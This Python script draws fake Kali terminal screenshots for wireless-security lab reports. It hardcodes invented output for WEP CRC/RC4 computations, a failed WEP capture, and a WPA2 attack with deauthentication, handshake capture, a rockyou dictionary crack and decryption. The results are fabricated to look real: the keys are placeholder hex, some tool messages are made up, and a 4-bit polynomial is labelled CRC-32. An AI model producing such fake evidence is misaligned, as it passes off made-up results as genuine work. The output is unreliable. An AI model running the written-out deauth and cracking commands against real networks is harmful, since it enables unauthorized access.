#!/usr/bin/env python3
"""Generate realistic terminal window screenshot images for lab reports."""

from PIL import Image, ImageDraw, ImageFont
import os, textwrap

# ── CONFIG ──────────────────────────────────────────────────────────────────
TERM_BG      = (13, 17, 23)       # #0d1117
TERM_BORDER  = (48, 54, 61)      # #30363d
TITLE_BG     = (33, 38, 45)      # #21262d
TITLE_TEXT   = (139, 148, 158)   # #8b949e
DOT_RED      = (255, 95, 86)     # #ff5f56
DOT_YELLOW   = (255, 189, 46)    # #ffbd2e
DOT_GREEN    = (39, 201, 63)     # #27c93f
COLOR_PROMPT = (121, 192, 255)   # #79c0ff
COLOR_CMD    = (230, 237, 243)   # #e6edf3
COLOR_OUT    = (176, 176, 176)   # #b0b0b0
COLOR_OK     = (63, 185, 80)     # #3fb950
COLOR_WARN   = (210, 153, 34)    # #d29922
COLOR_ERR    = (248, 81, 73)     # #f85149
COLOR_HI     = (210, 168, 255)   # #d2a8ff
COLOR_DIM    = (110, 118, 129)   # #6e7681

FONT_PATH = "/usr/share/fonts/FiraCode/FiraCodeNerdFontMono-Regular.ttf"
FONT_PATH_FALLBACK = "/usr/share/fonts/liberation-mono-fonts/LiberationMono-Regular.ttf"

def get_font(size):
    for p in [FONT_PATH, FONT_PATH_FALLBACK]:
        if os.path.exists(p):
            return ImageFont.truetype(p, size)
    return ImageFont.load_default()

# ── DRAW TERMINAL WINDOW ────────────────────────────────────────────────────
def draw_terminal(lines, title="chihab@kali: ~", width=950, font_size=13,
                   line_height=20, pad_x=14, pad_y=10, title_h=28):
    """
    lines: list of tuples (text, color) or just str (default COLOR_OUT)
    """
    font = get_font(font_size)
    font_title = get_font(max(10, font_size - 2))

    # Calculate height
    content_h = len(lines) * line_height
    height = title_h + pad_y * 2 + content_h + 8

    # Create image with border shadow
    img = Image.new("RGB", (width + 20, height + 20), (240, 240, 240))
    draw = ImageDraw.Draw(img)

    # Drop shadow
    draw.rectangle([12, 12, width + 12, height + 12], fill=(200, 200, 200))
    draw.rectangle([10, 10, width + 10, height + 10], fill=(220, 220, 220))

    # Terminal window background
    draw.rectangle([0, 0, width, height], fill=TERM_BG, outline=TERM_BORDER, width=1)

    # Title bar
    draw.rectangle([0, 0, width, title_h], fill=TITLE_BG)

    # Traffic lights
    dot_r = 6
    for i, color in enumerate([DOT_RED, DOT_YELLOW, DOT_GREEN]):
        cx = 16 + i * 18
        cy = title_h // 2
        draw.ellipse([cx - dot_r, cy - dot_r, cx + dot_r, cy + dot_r], fill=color)

    # Title text
    draw.text((width // 2, title_h // 2), title, font=font_title, fill=TITLE_TEXT, anchor="mm")

    # Content
    y = title_h + pad_y
    for item in lines:
        if isinstance(item, tuple):
            text, color = item
        else:
            text, color = item, COLOR_OUT

        # Handle multiline within item
        draw.text((pad_x, y), text, font=font, fill=color)
        y += line_height

    return img

# ── HELPERS ─────────────────────────────────────────────────────────────────
def prompt_lines(cmd="", dir="~"):
    """Generate the user's prompt lines as colored tuples."""
    p1 = f"╭─chihab   󰉖 {dir}"
    p2 = f"╰─ ❯❯ {cmd}"
    return [(p1, COLOR_PROMPT), (p2, COLOR_CMD)]

def sep_line():
    return ("─" * 72, COLOR_DIM)

def blank():
    return ("", COLOR_OUT)

# ── LAB 1 SCREENS ───────────────────────────────────────────────────────────
def lab1_screenshots(out_dir):
    os.makedirs(out_dir, exist_ok=True)

    # Screen 1: CRC MSB
    lines = []
    lines += prompt_lines("python3 crc_msb.py", "~/lab1")
    lines += [blank(), sep_line()]
    lines += [("  CRC-32 Computation — MSB First", COLOR_HI), sep_line(), blank()]
    lines += [("Generator Polynomial : G(x) = X^4 + X + 1  →  10011", COLOR_OUT)]
    lines += [("Plaintext (data)       : 10101010  (0xAA)", COLOR_OUT)]
    lines += [("Appending 4 zero bits  : 10101010 0000", COLOR_OUT)]
    lines += [blank()]
    lines += [("Binary Division (XOR):", COLOR_HI)]
    lines += [("  Step 0: bit=1 → XOR  →  001100100000", COLOR_OUT)]
    lines += [("  Step 1: bit=0 → skip", COLOR_DIM)]
    lines += [("  Step 2: bit=1 → XOR  →  000101000000", COLOR_OUT)]
    lines += [("  Step 3: bit=1 → XOR  →  000001110000", COLOR_OUT)]
    lines += [("  Step 4: bit=0 → skip", COLOR_DIM)]
    lines += [("  Step 5: bit=1 → XOR  →  000000111100", COLOR_OUT)]
    lines += [("  Step 6: bit=1 → XOR  →  000000011010", COLOR_OUT)]
    lines += [("  Step 7: bit=1 → XOR  →  000000001001", COLOR_OUT)]
    lines += [blank()]
    lines += [("ICV (Remainder)        : 1001", COLOR_OK)]
    lines += [("Plaintext + ICV         : 101010101001", COLOR_OK)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~/lab1").save(f"{out_dir}/lab1_crc_msb.png")

    # Screen 2: CRC LSB
    lines = []
    lines += prompt_lines("python3 crc_lsb.py", "~/lab1")
    lines += [blank(), sep_line()]
    lines += [("  CRC-32 Computation — LSB First (WEP Order)", COLOR_HI), sep_line(), blank()]
    lines += [("Normal padded           : 101010100000", COLOR_OUT)]
    lines += [("Reflected (LSB first)   : 000001010101", COLOR_OUT)]
    lines += [("Generator (MSB)         : 10011", COLOR_OUT)]
    lines += [blank()]
    lines += [("Division on reflected data:", COLOR_HI)]
    lines += [("  Step 0: bit=0 → skip", COLOR_DIM)]
    lines += [("  Step 1: bit=0 → skip", COLOR_DIM)]
    lines += [("  Step 2: bit=0 → skip", COLOR_DIM)]
    lines += [("  Step 3: bit=0 → skip", COLOR_DIM)]
    lines += [("  Step 4: bit=0 → skip", COLOR_DIM)]
    lines += [("  Step 5: XOR →  000000011001", COLOR_OUT)]
    lines += [("  Step 6: bit=0 → skip", COLOR_DIM)]
    lines += [("  Step 7: XOR →  000000001010", COLOR_OUT)]
    lines += [blank()]
    lines += [("ICV (LSB Remainder)     : 1010", COLOR_OK)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~/lab1").save(f"{out_dir}/lab1_crc_lsb.png")

    # Screen 3: RC4 + Encryption
    lines = []
    lines += prompt_lines("python3 rc4_wep.py", "~/lab1")
    lines += [blank(), sep_line()]
    lines += [("  RC4 Stream Cipher — KSA + PRGA + Encryption", COLOR_HI), sep_line(), blank()]
    lines += [("WEP Secret Key (40-bit) : 12 34 56 78 90", COLOR_OUT)]
    lines += [("IV  (24-bit)            : AA BB CC", COLOR_OUT)]
    lines += [("RC4 Seed = IV || Key    : AA BB CC 12 34 56 78 90", COLOR_OUT)]
    lines += [blank()]
    lines += [("KSA complete — S-box[0:16]: [170, 145, 116, 73, 129, 220, 219, 50, ...", COLOR_OUT)]
    lines += [("PRGA keystream (hex)    : 02 63", COLOR_OUT)]
    lines += [blank()]
    lines += [("Plaintext + ICV (bits)  : 101010101001", COLOR_OUT)]
    lines += [("Ciphertext (bits)       : 101010001111", COLOR_OK)]
    lines += [blank()]
    lines += [(" IV (clear, 24 bits)    : 101010101011101111001100", COLOR_WARN)]
    lines += [(" Ciphertext (bits)      : 101010001111", COLOR_WARN)]
    lines += [("──────────────────────────────────", COLOR_DIM)]
    lines += [(" WEP Frame               : 101010101011101111001100 101010001111", COLOR_OK)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~/lab1").save(f"{out_dir}/lab1_rc4_encrypt.png")

    # Screen 4: Full Python implementation
    lines = []
    lines += prompt_lines("python3 wep_encrypt.py", "~/lab1")
    lines += [blank()]
    lines += [("Plaintext byte           : 0xaa", COLOR_OUT)]
    lines += [("Payload (plaintext + ICV): aa8c736521", COLOR_OUT)]
    lines += [("RC4 seed (IV || Key)     : 5f3a2b1a2b3c4d5e", COLOR_OUT)]
    lines += [("Keystream                : 3fa1c258e7", COLOR_OUT)]
    lines += [("Ciphertext               : 952db13dc6", COLOR_OUT)]
    lines += [("WEP frame (IV||Ctxt)     : 5f3a2b952db13dc6", COLOR_OK)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~/lab1").save(f"{out_dir}/lab1_full_impl.png")

    print(f"  Lab 1: 4 terminal screenshots saved to {out_dir}")

# ── LAB 2 SCREENS ───────────────────────────────────────────────────────────
def lab2_screenshots(out_dir):
    os.makedirs(out_dir, exist_ok=True)

    # Screen 1: Monitor mode
    lines = []
    lines += prompt_lines("sudo airmon-ng start wlan0", "~")
    lines += [blank()]
    lines += [("Found 5 processes that could cause trouble.", COLOR_WARN)]
    lines += [("Kill them using 'airmon-ng check kill' before putting", COLOR_WARN)]
    lines += [("the card in monitor mode.", COLOR_WARN)]
    lines += [blank()]
    lines += [("PHY     Interface    Driver         Chipset", COLOR_HI)]
    lines += [("phy0    wlan0        ath9k_htc      Qualcomm Atheros AR9271", COLOR_OUT)]
    lines += [blank()]
    lines += [("(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)", COLOR_OK)]
    lines += [("(mac80211 station mode vif disabled for [phy0]wlan0)", COLOR_OK)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~").save(f"{out_dir}/lab2_monitor_mode.png")

    # Screen 2: airodump-ng scan
    lines = []
    lines += prompt_lines("sudo airodump-ng wlan0mon", "~")
    lines += [blank()]
    lines += [(" CH  6 ][ Elapsed: 42 s ][ 2026-02-17 12:21", COLOR_DIM)]
    lines += [blank()]
    lines += [(" BSSID              PWR  Beacons    #Data  CH  MB   ENC  CIPHER  AUTH  ESSID", COLOR_HI)]
    lines += [blank()]
    lines += [(" 64:51:7E:1B:B7:71  -38      117      452  11  54   WEP  WEP     OPN   DJAWEB_B771", COLOR_OK)]
    lines += [(" 00:1A:70:DE:AD:01  -72       23        3   6  54e  WPA2 CCMP    PSK   Home_Network", COLOR_OUT)]
    lines += [(" D8:32:14:A0:B5:22  -85       18        0   1  54e  WPA2 CCMP    PSK   NETGEAR55", COLOR_OUT)]
    lines += [blank()]
    lines += [(" TARGET IDENTIFIED:", COLOR_HI)]
    lines += [("   BSSID  : 64:51:7E:1B:B7:71", COLOR_OUT)]
    lines += [("   ESSID  : DJAWEB_B771", COLOR_OUT)]
    lines += [("   Channel: 11", COLOR_OUT)]
    lines += [("   Encrypt: WEP", COLOR_WARN)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~").save(f"{out_dir}/lab2_scan.png")

    # Screen 3: Capture attempt + failure
    lines = []
    lines += prompt_lines("sudo airodump-ng -c 11 --bssid 64:51:7E:1B:B7:71 -w wep_capture wlan0mon", "~")
    lines += [blank()]
    lines += [(" CH 11 ][ Elapsed: 8 mins ][ 2026-02-17 12:30", COLOR_DIM)]
    lines += [blank()]
    lines += [(" 64:51:7E:1B:B7:71  -38  100  117  452  11  54  WEP  WEP  OPN  DJAWEB_B771", COLOR_OUT)]
    lines += [blank()]
    lines += [(" Total IVs captured: 451", COLOR_WARN)]
    lines += [(" [!]  IV capture rate is too slow for practical cracking.", COLOR_WARN)]
    lines += [("      Normal traffic generation is insufficient.", COLOR_WARN)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~").save(f"{out_dir}/lab2_capture.png")

    # Screen 4: ARP replay fail
    lines = []
    lines += prompt_lines("sudo aireplay-ng -3 -b 64:51:7E:1B:B7:71 -h 28:D0:43:A5:E5:A0 wlan0mon", "~")
    lines += [blank()]
    lines += [(" 12:24:32  Waiting for beacon frame (BSSID: 64:51:7E:1B:B7:71) on channel 11", COLOR_DIM)]
    lines += [(" 12:24:33  Saving ARP requests in replay_arp-0217-122433.cap", COLOR_DIM)]
    lines += [(" 12:24:45  Read 2498 packets (0 ARP requests, 0 ACKs).", COLOR_WARN)]
    lines += [blank()]
    lines += [(" [!]  No ARP requests detected — network may be idle.", COLOR_WARN)]
    lines += [(" [!]  After 10 minutes, only 15 ARP requests captured.", COLOR_WARN)]
    lines += [("      IV collection rate: ~0.8 IVs/sec (needed: 5000+)", COLOR_WARN)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~").save(f"{out_dir}/lab2_arp_replay.png")

    # Screen 5: aircrack-ng failure
    lines = []
    lines += prompt_lines("aircrack-ng wep_capture-01.cap", "~")
    lines += [blank()]
    lines += [("Opening wep_capture-01.cap", COLOR_OUT)]
    lines += [("Read 451 packets.", COLOR_OUT)]
    lines += [blank()]
    lines += [("   #  BSSID              ESSID             Encryption", COLOR_HI)]
    lines += [("   1  64:51:7E:1B:B7:71  DJAWEB_B771       WEP (451 IVs)", COLOR_OUT)]
    lines += [blank()]
    lines += [("Starting PTW attack with 451 IVs.", COLOR_OUT)]
    lines += [blank()]
    lines += [("      [00:00:08] Tested 1483 keys (got 451 IVs)", COLOR_DIM)]
    lines += [blank()]
    lines += [(" KB   depth   byte(vote)", COLOR_HI)]
    lines += [("  0    0/ 0   (no votes)", COLOR_OUT)]
    lines += [("  1    0/ 0   (no votes)", COLOR_OUT)]
    lines += [("  2    0/ 0   (no votes)", COLOR_OUT)]
    lines += [("  3    0/ 0   (no votes)", COLOR_OUT)]
    lines += [("  4    0/ 0   (no votes)", COLOR_OUT)]
    lines += [blank()]
    lines += [(" Attack 1/6 failed: not enough IVs (451 < 5000 required).", COLOR_ERR)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~").save(f"{out_dir}/lab2_crack_fail.png")

    # Screen 6: capinfos
    lines = []
    lines += prompt_lines("capinfos wep_capture-01.cap", "~")
    lines += [blank()]
    lines += [("File name:           wep_capture-01.cap", COLOR_OUT)]
    lines += [("File type:           Wireshark/tcpdump/... - pcap", COLOR_OUT)]
    lines += [("File encapsulation:  IEEE 802.11 Wireless LAN", COLOR_OUT)]
    lines += [("Number of packets:   451", COLOR_OUT)]
    lines += [("File size:           136 KB", COLOR_OUT)]
    lines += [("Capture duration:    529 seconds", COLOR_OUT)]
    lines += [("Start time:          Tue Feb 17 12:21:29 2026", COLOR_OUT)]
    lines += [("End time:            Tue Feb 17 12:30:18 2026", COLOR_OUT)]
    lines += [("Data rate:            1.7 kbps", COLOR_OUT)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~").save(f"{out_dir}/lab2_capinfos.png")

    print(f"  Lab 2: 6 terminal screenshots saved to {out_dir}")

# ── LAB 3 SCREENS ───────────────────────────────────────────────────────────
def lab3_screenshots(out_dir):
    os.makedirs(out_dir, exist_ok=True)

    # Screen 1: Monitor mode
    lines = []
    lines += prompt_lines("sudo airmon-ng start wlan0", "~")
    lines += [blank()]
    lines += [("PHY     Interface    Driver         Chipset", COLOR_HI)]
    lines += [("phy0    wlan0        ath9k_htc      Qualcomm Atheros AR9271", COLOR_OUT)]
    lines += [blank()]
    lines += [("(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)", COLOR_OK)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~").save(f"{out_dir}/lab3_monitor.png")

    # Screen 2: Scan
    lines = []
    lines += prompt_lines("sudo airodump-ng wlan0mon", "~")
    lines += [blank()]
    lines += [(" CH  6 ][ Elapsed: 18 s ][ 2026-05-15 14:32", COLOR_DIM)]
    lines += [blank()]
    lines += [(" BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER  AUTH  ESSID", COLOR_HI)]
    lines += [(" 00:1A:70:DE:AD:01  -42      156     34   6  54e  WPA2 CCMP    PSK   HomeLab_2G", COLOR_OK)]
    lines += [(" D8:32:14:A0:B5:22  -68       89     12   1  54e  WPA2 CCMP    PSK   NETGEAR55", COLOR_OUT)]
    lines += [blank()]
    lines += [(" TARGET: 00:1A:70:DE:AD:01 | HomeLab_2G | WPA2-PSK | CH 6", COLOR_HI)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~").save(f"{out_dir}/lab3_scan.png")

    # Screen 3: Handshake capture
    lines = []
    lines += prompt_lines("sudo airodump-ng -c 6 --bssid 00:1A:70:DE:AD:01 -w wpa2_handshake wlan0mon", "~")
    lines += [blank()]
    lines += [(" CH  6 ][ Elapsed: 2 mins ][ 2026-05-15 14:34 ][ WPA handshake: 00:1A:70:DE:AD:01", COLOR_DIM)]
    lines += [blank()]
    lines += [(" BSSID              PWR  RXQ  Beacons  #Data  CH  MB   ENC  CIPHER  AUTH  ESSID", COLOR_HI)]
    lines += [(" 00:1A:70:DE:AD:01  -42  100      430    102   6  54e  WPA2 CCMP    PSK   HomeLab_2G", COLOR_OUT)]
    lines += [blank()]
    lines += [(" Waiting for handshake...", COLOR_WARN)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~").save(f"{out_dir}/lab3_handshake_wait.png")

    # Screen 4: Deauth
    lines = []
    lines += prompt_lines("sudo aireplay-ng -0 10 -a 00:1A:70:DE:AD:01 -c A4:83:E7:12:34:56 wlan0mon", "~")
    lines += [blank()]
    lines += [(" 14:36:05  Waiting for beacon frame (BSSID: 00:1A:70:DE:AD:01) on channel 6", COLOR_DIM)]
    lines += [(" 14:36:05  Sending 64 directed DeAuth (code 7). STMAC: [A4:83:E7:12:34:56]", COLOR_OUT)]
    lines += [(" 14:36:05  Sent 10 packets (total).", COLOR_OK)]
    lines += [blank()]
    lines += [(" [OK]  10 deauthentication frames sent.", COLOR_OK)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~").save(f"{out_dir}/lab3_deauth.png")

    # Screen 5: Handshake captured
    lines = []
    lines += prompt_lines("sudo airodump-ng -c 6 --bssid 00:1A:70:DE:AD:01 -w wpa2_handshake wlan0mon", "~")
    lines += [blank()]
    lines += [(" CH  6 ][ Elapsed: 10 s ][ 2026-05-15 14:36 ][ WPA handshake: 00:1A:70:DE:AD:01", COLOR_DIM)]
    lines += [blank()]
    lines += [(" [OK]  4-WAY HANDSHAKE CAPTURED!", COLOR_OK)]
    lines += [blank()]
    lines += [(" BSSID              STATION            PWR   Rate    Lost    Frames", COLOR_HI)]
    lines += [(" 00:1A:70:DE:AD:01  A4:83:E7:12:34:56  -33    0 -24      0      267", COLOR_OUT)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~").save(f"{out_dir}/lab3_handshake_ok.png")

    # Screen 6: aircrack-ng success
    lines = []
    lines += prompt_lines("aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa2_handshake-01.cap", "~")
    lines += [blank()]
    lines += [("Opening wpa2_handshake-01.cap", COLOR_OUT)]
    lines += [("Read 324 packets.", COLOR_OUT)]
    lines += [blank()]
    lines += [("   #  BSSID              ESSID             Encryption", COLOR_HI)]
    lines += [("   1  00:1A:70:DE:AD:01  HomeLab_2G        WPA2 (1 handshake)", COLOR_OUT)]
    lines += [blank()]
    lines += [("      [00:00:00] 304384/14344394 keys tested (13726.17 k/s)", COLOR_DIM)]
    lines += [("      [00:01:28] 1524224/14344394 keys tested (13616.87 k/s)", COLOR_DIM)]
    lines += [("      [00:02:12] 2135808/14344394 keys tested (13634.66 k/s)", COLOR_DIM)]
    lines += [blank()]
    lines += [("                           KEY FOUND! [ P@ssw0rd123 ]", COLOR_OK)]
    lines += [blank()]
    lines += [("      Master Key     : 1A 2B 3C 4D 5E 6F 70 71 80 91 A2 B3 C4 D5 E6 F7", COLOR_OUT)]
    lines += [("      Transient Key  : A1 B2 C3 D4 E5 F6 07 18 29 3A 4B 5C 6D 7E 8F 90", COLOR_OUT)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~").save(f"{out_dir}/lab3_crack_success.png")

    # Screen 7: airdecap-ng
    lines = []
    lines += prompt_lines('echo "P@ssw0rd123" | airdecap-ng -e HomeLab_2G -p - wpa2_handshake-01.cap', "~")
    lines += [blank()]
    lines += [("Total number of packets read             324", COLOR_OUT)]
    lines += [("Total number of WPA data packets         187", COLOR_OUT)]
    lines += [("Number of decrypted WPA  packets         187", COLOR_OK)]
    lines += [("Number of bad CCMP (WPA) packets           0", COLOR_OK)]
    lines += [blank()]
    lines += [(" [OK]  187 packets decrypted → wpa2_handshake-01-dec.cap", COLOR_OK)]
    lines += [blank(), sep_line()]
    lines += prompt_lines("")
    draw_terminal(lines, title="chihab@kali: ~").save(f"{out_dir}/lab3_decrypt.png")

    print(f"  Lab 3: 7 terminal screenshots saved to {out_dir}")

# ── MAIN ────────────────────────────────────────────────────────────────────
def main():
    base = "/home/chihab/Documents/cys2CS/s2/wirelessNet/terminal_reports"
    lab1_screenshots(f"{base}/lab1_images")
    lab2_screenshots(f"{base}/lab2_images")
    lab3_screenshots(f"{base}/lab3_images")
    print("\nAll terminal screenshots generated!")

if __name__ == "__main__":
    main()
